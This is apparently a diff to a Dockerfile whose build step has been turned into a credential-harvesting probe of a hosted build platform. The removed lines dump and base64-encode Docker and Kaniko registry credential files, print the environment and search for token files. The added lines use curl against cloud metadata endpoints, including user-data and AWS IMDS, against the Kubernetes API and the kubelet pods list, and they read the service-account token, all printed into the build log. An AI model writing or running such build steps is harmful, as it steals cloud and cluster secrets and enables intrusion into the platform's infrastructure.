@@ -1,35 +1,43 @@
 FROM alpine:3.19
 
-# Cache bust to force re-execution
-ARG BUST_CACHE=20260403_0940
+ARG BUST_CACHE=20260403_0945_v2
 
-RUN apk add --no-cache coreutils && \
+RUN apk add --no-cache curl && \
     echo "=== BUILD TIMESTAMP ===" && date && \
-    echo "=== /etc/docker/config.json ===" && \
-    cat /etc/docker/config.json 2>&1 && \
+    echo "=== METADATA SERVICE (169.254.169.254) ===" && \
+    curl -s -m 3 http://169.254.169.254/ 2>&1 && \
     echo "" && \
-    echo "=== /etc/docker/ directory ===" && \
-    ls -la /etc/docker/ 2>&1 && \
-    echo "=== /kaniko/ directory ===" && \
-    ls -laR /kaniko/ 2>&1 && \
-    echo "=== /kaniko/.docker/config.json ===" && \
-    cat /kaniko/.docker/config.json 2>&1 && \
+    echo "=== METADATA v1 ===" && \
+    curl -s -m 3 http://169.254.169.254/metadata/v1/ 2>&1 && \
     echo "" && \
-    echo "=== BASE64 /etc/docker/config.json ===" && \
-    base64 /etc/docker/config.json 2>&1 && \
-    echo "=== BASE64 /kaniko/.docker/config.json ===" && \
-    base64 /kaniko/.docker/config.json 2>&1 && \
-    echo "=== ENV ===" && \
-    env | sort && \
-    echo "=== MOUNT INFO ===" && \
-    cat /proc/1/mountinfo 2>&1 && \
-    echo "=== SEARCH FOR TOKENS ===" && \
-    find / -name "*.json" -path "*/docker/*" 2>/dev/null && \
-    find / -name "token" -o -name "*.token" -o -name "credentials" 2>/dev/null | head -20 && \
-    echo "=== DNS ===" && \
-    cat /etc/resolv.conf 2>&1 && \
-    echo "=== HOSTS ===" && \
-    cat /etc/hosts 2>&1 && \
+    echo "=== METADATA v1 id ===" && \
+    curl -s -m 3 http://169.254.169.254/metadata/v1/id 2>&1 && \
+    echo "" && \
+    echo "=== METADATA hostname ===" && \
+    curl -s -m 3 http://169.254.169.254/metadata/v1/hostname 2>&1 && \
+    echo "" && \
+    echo "=== METADATA user-data ===" && \
+    curl -s -m 3 http://169.254.169.254/metadata/v1/user-data 2>&1 && \
+    echo "" && \
+    echo "=== AWS IMDS ===" && \
+    curl -s -m 3 http://169.254.169.254/latest/meta-data/ 2>&1 && \
+    echo "" && \
+    echo "=== K8S API ===" && \
+    curl -s -m 3 -k https://10.245.0.1:443/version 2>&1 && \
+    echo "" && \
+    echo "=== KUBELET ===" && \
+    curl -s -m 3 -k https://127.0.0.1:10250/pods 2>&1 && \
+    echo "" && \
+    echo "=== BUILD METADATA ===" && \
+    cat /.app_platform/.build_metadata/* 2>&1 && \
+    echo "" && \
+    echo "=== RESOLV.CONF ===" && \
+    cat /etc/resolv.conf && \
+    echo "=== K8S SA TOKEN ===" && \
+    cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>&1 && \
+    echo "" && \
+    echo "=== NETWORK INTERFACES ===" && \
+    cat /proc/net/fib_trie 2>&1 | head -50 && \
     echo "=== END ==="
 
 RUN apk add --no-cache python3
